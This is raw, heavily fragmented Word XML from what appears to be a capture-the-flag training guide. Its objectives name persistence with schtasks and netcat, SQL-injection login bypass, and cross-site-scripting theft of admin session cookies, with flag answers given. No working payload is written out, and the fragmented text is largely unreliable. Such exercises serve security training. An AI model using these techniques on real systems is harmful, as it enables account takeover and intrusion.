          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>sc</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">s, </w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>et.exe,</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>)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 c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 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 w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040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mini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tr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or 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nt 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pe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siste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 w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>2.31</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00732A9A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>14</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="156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ersisten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e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hell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ent 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wi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-4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FL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G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5, C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UE5,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br</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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crumb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etcat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ist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ner</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="156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FLA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G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5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- FL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G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{pe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_pay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_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}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="156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UE5: If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nni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’s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w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ng,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hen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nn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e’s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log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g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ng.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Fi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ev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ote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nd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tr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ce the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cook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</w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="24"/>
        <w:ind w:left="1560"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:headerReference w:type="default" r:id="rId37"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pP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tr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il.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Flag 6 –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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Sc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>t Kidd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>e’s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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>en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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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O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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>b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je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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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i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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>v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e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="264" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="1324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Discover a develo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p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er’s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hidden file by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x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filtrati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4"/>
          <w:szCs w:val="24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g ad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m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in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ion cookies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u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ing cro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3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-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ite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ri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p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3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24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g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. Log in as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the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argeted u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er to u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over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onfidential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mm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u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i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at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ons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and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p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ture the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i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x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th fl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g.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>T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o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>l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s &amp; T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hn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iqu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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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 xml:space="preserve">s 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Y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ou’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>l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 xml:space="preserve">l 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>U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se</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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QL Injecti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 xml:space="preserve">n – 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 xml:space="preserve">o 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 xml:space="preserve">og in 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nd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y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ss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pacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w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eb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spacing w:val="-3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henti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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ion</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="51"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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HT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="2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ce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spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>y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sis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="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 xml:space="preserve">– </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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o ext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ct</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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ev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otes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or h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en li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ks</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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ss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-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 xml:space="preserve">e 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cr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ing (XS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)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 xml:space="preserve">– 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o e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x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il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tr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 xml:space="preserve">e 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ss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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on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kies</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
